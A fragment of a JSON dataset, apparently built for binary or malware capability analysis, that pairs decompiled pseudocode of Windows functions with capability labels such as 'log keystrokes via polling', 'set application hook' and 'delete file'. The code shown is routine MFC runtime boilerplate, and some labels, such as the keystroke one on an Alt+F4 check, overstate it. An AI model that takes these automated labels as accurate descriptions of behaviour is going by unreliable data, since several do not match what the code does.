        "decompiled_code": "\nvoid __cdecl fcn.0044cb50(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t arg_8h_00;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    arg_8h_00 = 0;\n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    iVar1 = (*_sym.imp.ole32.dll_CreateILockBytesOnHGlobal)(0, 1, &var_4h);\n    if (iVar1 == 0) goto code_r0x0044cb73;\n    while( true ) {\n        do {\n            fcn.00413258(arg_8h_00);\ncode_r0x0044cb73:\n            arg_8h_00 = (*_sym.imp.ole32.dll_StgCreateDocfileOnILockBytes)(var_4h, 0x1012, 0, &var_8h);\n            (**(*var_4h + 8))(var_4h);\n        } while (arg_8h_00 != 0);\n        in_ECX = fcn.00431b02(in_ECX[9], 0x4a1088);\n        arg_8h_00 = (*_sym.imp.ole32.dll_OleSave)(in_ECX, var_8h, 0);\n        (**(*in_ECX + 0x20))(in_ECX, 0);\n        (**(*in_ECX + 8))(in_ECX);\n        if (arg_8h_00 == 0) break;\n        (**(*var_8h + 8))(var_8h);\n    }\n    arg_8h[2] = 0;\n    *arg_8h = 8;\n    arg_8h[1] = var_8h;\n    return;\n}\n",
        "token_count": 420
    },
    "0044cf2e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0044cf2e(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t var_4h;\n    \n    piVar1 = *(param_1 + 0x20);\n    iVar3 = piVar1[0x1c];\n    var_4h = param_1;\n    while( true ) {\n        var_4h = (**(*piVar1 + 0xb4))();\n        iVar2 = fcn.00450d9b(&var_4h);\n        if (iVar2 == 0) break;\n        do {\n            if (*(iVar2 + 0x2c) == iVar3) break;\n            iVar2 = fcn.00450d9b();\n        } while (iVar2 != 0);\n        if (iVar2 == 0) break;\n        iVar3 = iVar3 + 1;\n    }\n    piVar1[0x1c] = iVar3 + 1;\n    return iVar3;\n}\n",
        "token_count": 236
    },
    "00451a5d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451a5d(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_24h;\n    uint var_20h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    piVar2 = fcn.00431b42(0x4a0ff8);\n    iVar3 = (**(*piVar2 + 0x20))(piVar2, 1, &var_4h);\n    if (iVar3 == 0) {\n        iVar3 = (**(*var_4h + 0xc))(var_4h, 1, &var_24h, 0);\n        pcVar1 = _sym.imp.ole32.dll_CoTaskMemFree;\n        while (iVar3 == 0) {\n            iVar3 = (**(*piVar2 + 0xc))(piVar2, &var_24h, &var_10h);\n            if (iVar3 == 0) {\n                if (var_8h != 0) {\n                    (*_sym.imp.ole32.dll_ReleaseStgMedium)(&var_10h);\n                    goto code_r0x00451abd;\n                }\n                fcn.00453f6a(0, &var_10h, &var_24h);\n            }\n            else {\ncode_r0x00451abd:\n                (*pcVar1)(var_20h);\n            }\n            iVar3 = (**(*var_4h + 0xc))(var_4h, 1, &var_24h, 0);\n        }\n        (**(*var_4h + 8))(var_4h);\n    }\n    return;\n}\n",
        "token_count": 392
    },
    "004522f6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_20h\n\nvoid __cdecl fcn.004522f6(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint uVar5;\n    uint var_4h;\n    \n    fcn.004627e2(0x18);\n    *(unaff_EBP + -0x20) = extraout_ECX;\n    uVar5 = 0;\n    iVar4 = (*_sym.imp.ole32.dll_CreateILockBytesOnHGlobal)(0, 1, unaff_EBP + -0x14);\n    if (iVar4 == 0) goto code_r0x00452322;\n    while( true ) {\n        fcn.00413258(uVar5);\ncode_r0x00452322:\n        iVar4 = (*_sym.imp.ole32.dll_StgCreateDocfileOnILockBytes)(*(unaff_EBP + -0x14), 0x1012, 0, unaff_EBP + -0x18);\n        *(unaff_EBP + -0x1c) = iVar4;\n        if (iVar4 == 0) break;\n        (**(**(unaff_EBP + -0x14) + 8))(*(unaff_EBP + -0x14));\n        uVar5 = *(unaff_EBP + -0x1c);\n    }\n    iVar4 = *(extraout_ECX + 0x20);\n    piVar1 = *(unaff_EBP + -0x20);\n    *(iVar4 + 0x80) = 0;\n    *(iVar4 + 0x84) = 0;\n    iVar2 = *piVar1;\n    *(unaff_EBP + -0x1c) = iVar4;\n    *(unaff_EBP + -4) = 0;\n    (**(iVar2 + 0xa0))(*(unaff_EBP + -0x18));\n    fcn.00450e08(0, 0);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(iVar4 + 0x80) = 1;\n    *(iVar4 + 0x84) = 1;\n    (**(**(unaff_EBP + -0x14) + 8))(*(unaff_EBP + -0x14));\n    puVar3 = *(unaff_EBP + 8);\n    uVar5 = *(unaff_EBP + -0x18);\n    *puVar3 = 8;\n    puVar3[1] = uVar5;\n    puVar3[2] = 0;\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 714
    },
    "00453736": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00453736(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 == 0) {\n        fcn.00411e42();\n    }\n    if (param_2 == 0) {\n        iVar1 = 0;\n        do {\n            if ((*(iVar1 * 8 + 0x49b324) & 0xf000) == (*(param_1 + 0x80) & 0xf000)) {\n                iVar1 = fcn.00420f26(*(iVar1 * 8 + 0x49b320));\n                if (iVar1 != 0) goto code_r0x00453787;\n                break;\n            }\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < 4);\n        fcn.00411e42();\n    }\ncode_r0x00453787:\n    fcn.004384c9(param_1, param_2);\n    return;\n}\n",
        "token_count": 222
    },
    "0045ac25": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0045ac25(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043026e();\n    fcn.0043039f(0);\n    for (iVar1 = *(iVar1 + 0x24); iVar1 != 0; iVar1 = *(iVar1 + 0x20)) {\n        fcn.0045a70b();\n    }\n    fcn.0043040c(0);\n    return;\n}\n",
        "token_count": 104
    },
    "0045c619": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c619(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    if (0 < param_1[1]) {\n        do {\n            fcn.0045e756(*(*param_1 + iVar1 * 4));\n            iVar1 = iVar1 + 1;\n        } while (iVar1 < param_1[1]);\n    }\n    fcn.004115a4(*param_1);\n    return;\n}\n",
        "token_count": 112
    },
    "00467455": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00467455(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004637fc(0x4b0578, 0xc);\n    fcn.00465cd3(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4bbef8;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4bbef4;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x00467499;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0045e756(arg_8h_00);\ncode_r0x00467499:\n        fcn.0045e756(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004674bc();\n    fcn.00463841();\n    return;\n}\n",
        "token_count": 394
    },
    "004675ba": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004675ba(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004637fc(0x4b05b8, 0xc);\n    fcn.00465cd3(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4bbef8;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4bbef4;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004675fe;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0045e756(arg_8h_00);\ncode_r0x004675fe:\n        fcn.0045e756(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00467621();\n    fcn.00463841();\n    return;\n}\n",
        "token_count": 395
    },
    "00488772": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00488772(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = in_ECX + 0x18;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar5);\n    iVar4 = 0;\n    if (0 < *(in_ECX + 0x34)) {\n        do {\n            iVar5 = iVar4;\n            piVar1 = fcn.00488623();\n            if (*piVar1 == arg_8h) {\n                fcn.004885e0();\n                uVar3 = 1;\n                goto code_r0x004887ba;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < *(in_ECX + 0x34));\n    }\n    iVar4 = iVar5;\n    uVar3 = 0;\ncode_r0x004887ba:\n    uVar2 = fcn.00488723(iVar4);\n    return uVar2 & 0xffffff00 | uVar3;\n}\n",
        "token_count": 281
    },
    "00412928": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: hWnd\n// WARNING: Variable defined which should be unmapped: hResData\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n\nvoid fcn.00412928(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint uVar5;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint hResData;\n    uint hWnd;\n    uint var_4h;\n    uint uVar6;\n    \n    uVar6 = 0x24;\n    fcn.004627e2(0x24);\n    *(unaff_EBP + -0x20) = extraout_ECX;\n    *(unaff_EBP + -0x1c) = extraout_ECX[0x18];\n    *(unaff_EBP + -0x18) = extraout_ECX[0x17];\n    iVar1 = fcn.0043026e();\n    uVar5 = *(iVar1 + 0xc);\n    if (extraout_ECX[0x16] != 0) {\n        iVar1 = fcn.0043026e();\n        uVar5 = *(iVar1 + 0xc);\n        uVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar5, extraout_ECX[0x16], 5);\n        uVar2 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar5, uVar2);\n        *(unaff_EBP + -0x18) = uVar2;\n    }\n    if (*(unaff_EBP + -0x18) != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_LockResource)(*(unaff_EBP + -0x18));\n        *(unaff_EBP + -0x1c) = uVar2;\n    }\n    if (*(unaff_EBP + -0x1c) != 0) {\n        uVar2 = fcn.00412447();\n        *(unaff_EBP + -0x14) = uVar2;\n        fcn.0041866d();\n        *(unaff_EBP + -0x28) = 0;\n        *(unaff_EBP + -0x2c) = 0;\n        *(unaff_EBP + -0x24) = 0;\n        if (((*(unaff_EBP + -0x14) != 0) &&\n            (iVar1 = (*_sym.imp.USER32.dll_GetDesktopWindow)(),  *(unaff_EBP + -0x14) != iVar1)) &&\n           (iVar1 = (*_sym.imp.USER32.dll_IsWindowEnabled)(*(unaff_EBP + -0x14)),  iVar1 != 0)) {\n            (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 0);\n            *(unaff_EBP + -0x2c) = 1;\n            piVar3 = fcn.004122c3();\n            *(unaff_EBP + -0x24) = piVar3;\n            if (((piVar3 != NULL) && (iVar1 = (**(*piVar3 + 0x120))(),  iVar1 != 0)) &&\n               (iVar1 = fcn.0041bf9b(),  iVar1 != 0)) {\n                uVar6 = 0;\n                fcn.0041bfb6();\n                *(unaff_EBP + -0x28) = 1;\n            }\n        }\n        *(unaff_EBP + -4) = 0;\n        fcn.0041a8cb(extraout_ECX, uVar6);\n        uVar6 = fcn.004185c5(*(unaff_EBP + -0x14));\n        iVar1 = fcn.00412738(*(unaff_EBP + -0x1c), uVar6, uVar5);\n        if (iVar1 != 0) {\n            if ((*(extraout_ECX + 0xf) & 0x10) != 0) {\n                uVar5 = 4;\n                uVar4 = fcn.0041be35();\n                if ((uVar4 & 0x100) != 0) {\n                    uVar5 = 5;\n                }\n                fcn.0041811b(uVar5);\n            }\n            if (extraout_ECX[8] != 0) {\n                fcn.0041c2a1(0, 0, 0, 0, 0, 0x97);\n            }\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x28) != 0) {\n            fcn.0041bfb6(1);\n        }\n        if (*(unaff_EBP + -0x2c) != 0) {\n            (*_sym.imp.USER32.dll_EnableWindow)(*(unaff_EBP + -0x14), 1);\n        }\n        if ((*(unaff_EBP + -0x14) != 0) && (iVar1 = (*_sym.imp.USER32.dll_GetActiveWindow)(),  iVar1 == extraout_ECX[8])\n           ) {\n            (*_sym.imp.USER32.dll_SetActiveWindow)(*(unaff_EBP + -0x14));\n        }\n        (**(*extraout_ECX + 0x60))();\n        fcn.00412481();\n        if (extraout_ECX[0x16] != 0) {\n            (*_sym.imp.KERNEL32.dll_FreeResource)(*(unaff_EBP + -0x18));\n        }\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 1379
    },
    "00412b16": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412b16(uint lpName, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint arg_8h;\n    uint var_4h;\n    \n    arg_8h = 0;\n    iVar1 = fcn.0043026e();\n    uVar3 = *(iVar1 + 0xc);\n    uVar2 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar3, lpName, 5);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar3, uVar2);\n    if (iVar1 != 0) {\n        arg_8h = (*_sym.imp.KERNEL32.dll_LockResource)(iVar1);\n    }\n    uVar3 = fcn.00412738(arg_8h, arg_ch, uVar3);\n    (*_sym.imp.KERNEL32.dll_FreeResource)(iVar1);\n    return uVar3;\n}\n",
        "token_count": 216
    },
    "00412b6c": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid fcn.00412b6c(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LockResource)(param_1);\n    fcn.00412aeb(uVar1, param_1, 0, param_2);\n    return;\n}\n",
        "token_count": 76
    },
    "0041bbe0": {
        "rules": [
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nuint fcn.0041bbe0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t arg_8h;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    arg_8h = 0;\n    if (param_1 != 0) {\n        iVar1 = fcn.0043026e();\n        uVar2 = *(iVar1 + 0xc);\n        iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(uVar2, param_1, 0xf0);\n        if (iVar1 != 0) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(uVar2, iVar1);\n            if (iVar3 == 0) {\n                return 0;\n            }\n            arg_8h = (*_sym.imp.KERNEL32.dll_LockResource)(iVar3);\n        }\n    }\n    uVar2 = fcn.0041b797(arg_8h);\n    if ((arg_8h != 0) && (iVar3 != 0)) {\n        (*_sym.imp.KERNEL32.dll_FreeResource)(iVar3);\n    }\n    return uVar2;\n}\n",
        "token_count": 263
    },
    "00415534": {
        "rules": [
            "link function at runtime on Windows",
            "link many functions at runtime"
        ],
        "decompiled_code": "\nbool fcn.00415534(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    if (*0x4bb06c != 0) {\n        return *0x4bb060 != 0;\n    }\n    *0x4bb070 = fcn.004154dc();\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"USER32\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (((((iVar2 != 0) && (*0x4bb050 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, 0x49307c),  *0x4bb050 != 0)) &&\n         (*0x4bb054 = (*pcVar1)(iVar2, \"MonitorFromWindow\"),  *0x4bb054 != 0)) &&\n        ((*0x4bb058 = (*pcVar1)(iVar2, \"MonitorFromRect\"),  *0x4bb058 != 0 &&\n         (*0x4bb05c = (*pcVar1)(iVar2, \"MonitorFromPoint\"),  *0x4bb05c != 0)))) &&\n       ((*0x4bb064 = (*pcVar1)(iVar2, \"EnumDisplayMonitors\"),  *0x4bb064 != 0 &&\n        ((*0x4bb060 = (*pcVar1)(iVar2, \"GetMonitorInfoA\"),  *0x4bb060 != 0 &&\n         (*0x4bb068 = (*pcVar1)(iVar2, \"EnumDisplayDevicesA\"),  *0x4bb068 != 0)))))) {\n        *0x4bb06c = 1;\n        return true;\n    }\n    *0x4bb050 = 0;\n    *0x4bb054 = 0;\n    *0x4bb058 = 0;\n    *0x4bb05c = 0;\n    *0x4bb060 = 0;\n    *0x4bb064 = 0;\n    *0x4bb068 = 0;\n    *0x4bb06c = 1;\n    return false;\n}\n",
        "token_count": 469
    },
    "0042d667": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042d667(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"GDI32.DLL\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"GetLayout\");\n    if (pcVar2 == NULL) {\n        uVar1 = 0xffffffff;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0x78);\n    }\n    else {\n        uVar1 = (*pcVar2)(*(param_1 + 4));\n    }\n    return uVar1;\n}\n",
        "token_count": 148
    },
    "0042d69d": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042d69d(int32_t param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t unaff_EDI;\n    uint uVar3;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"GDI32.DLL\");\n    uVar3 = 0;\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"SetLayout\");\n    if (pcVar2 == NULL) {\n        if (unaff_EDI != 0) {\n            uVar3 = 0xffffffff;\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0x78);\n        }\n    }\n    else {\n        uVar3 = (*pcVar2)(*(param_1 + 4), unaff_EDI);\n    }\n    return uVar3;\n}\n",
        "token_count": 191
    },
    "0044b6af": {
        "rules": [
            "log keystrokes via polling"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044b6af(uint32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = fcn.0041be35();\n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    if ((uVar3 < 0) &&\n       ((((arg_8h & 0xfff0) != 0xf060 ||\n         (((iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x73),  iVar2 < 0 && (iVar2 = (*pcVar1)(0x12),  iVar2 < 0)) &&\n          ((uVar3 & 0x100) != 0)))) && (iVar4 = fcn.00419f15(arg_8h, arg_ch),  iVar4 != 0)))) {\n        return;\n    }\n    fcn.00420886(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 227
    },
    "0042faf7": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042faf7(code **param_1)\n\n{\n    code *pcVar1;\n    \n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    *param_1 = vtable._AFX_THREAD_STATE.0;\n    if (param_1[0xb] != NULL) {\n        (*pcVar1)(param_1[0xb]);\n    }\n    if (param_1[10] != NULL) {\n        (*pcVar1)(param_1[10]);\n    }\n    if (param_1[3] != NULL) {\n        fcn.0045e756(param_1[3]);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00448e19": {
        "rules": [
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00448e19(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    fcn.00448d7a();\n    iVar2 = fcn.0043026e();\n    if ((*(iVar2 + 4) != 0) && (pcVar1 = *(*(iVar2 + 4) + 0x3c),  pcVar1 != NULL)) {\n        (*pcVar1)(1, 0);\n    }\n    iVar2 = fcn.004302e1();\n    if ((*(iVar2 + 0x3c) != NULL) && (iVar3 = (**(**(iVar2 + 0x3c) + 0x13c))(),  iVar3 != 0)) {\n        *(iVar2 + 0x3c) = 0;\n    }\n    iVar2 = fcn.0042fcbb();\n    iVar3 = fcn.0043026e();\n    pcVar1 = _sym.imp.USER32.dll_UnhookWindowsHookEx;\n    if (*(iVar3 + 0x14) == '\\0') {\n        if (*(iVar2 + 0x2c) != 0) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar2 + 0x2c));\n            *(iVar2 + 0x2c) = 0;\n        }\n        if (*(iVar2 + 0x28) != 0) {\n            (*pcVar1)(*(iVar2 + 0x28));\n            *(iVar2 + 0x28) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 358
    },
    "004308b4": {
        "rules": [
            "get thread local storage value"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004308b4(uint *param_1)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    puVar1 = param_1 + 7;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar1);\n    if ((((0 < unaff_retaddr) && (unaff_retaddr < param_1[3])) &&\n        (iVar3 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1),  iVar3 != 0)) && (unaff_retaddr < *(iVar3 + 8))) {\n        uVar2 = *(*(iVar3 + 0xc) + unaff_retaddr * 4);\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n        return uVar2;\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar1);\n    return 0;\n}\n",
        "token_count": 214
    },
    "0043f6e6": {
        "rules": [
            "move file"
        ],
        "decompiled_code": "\nvoid fcn.0043f6e6(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_MoveFileA)(param_1, param_2);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(param_2);\n        fcn.00441745(uVar2);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0043f70b": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nvoid fcn.0043f70b(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileA)(param_1);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)(unaff_retaddr);\n        fcn.00441745(uVar2);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00441886": {
        "rules": [
            "find graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00441886(uint *arg_8h, int32_t *arg_ch, int32_t *arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.USER32.dll_FindWindowA)(\"MouseZ\", \"Magellan MSWHEEL\");\n    pcVar1 = _sym.imp.USER32.dll_RegisterWindowMessageA;\n    uVar3 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(\"MSWHEEL_ROLLMSG\");\n    *arg_8h = uVar3;\n    iVar4 = (*pcVar1)(\"MSH_WHEELSUPPORT_MSG\");\n    *arg_ch = iVar4;\n    iVar4 = (*pcVar1)(\"MSH_SCROLL_LINES_MSG\");\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    *arg_10h = iVar4;\n    if (*arg_ch == 0) {\n        *arg_14h = 0;\n    }\n    else {\n        uVar3 = (*pcVar1)(uVar2, *arg_ch, 0, 0);\n        *arg_14h = uVar3;\n    }\n    if (*arg_10h == 0) {\n        *arg_18h = 3;\n    }\n    else {\n        uVar3 = (*pcVar1)(uVar2, *arg_10h, 0, 0);\n        *arg_18h = uVar3;\n    }\n    return uVar2;\n}\n",
        "token_count": 359
    }
}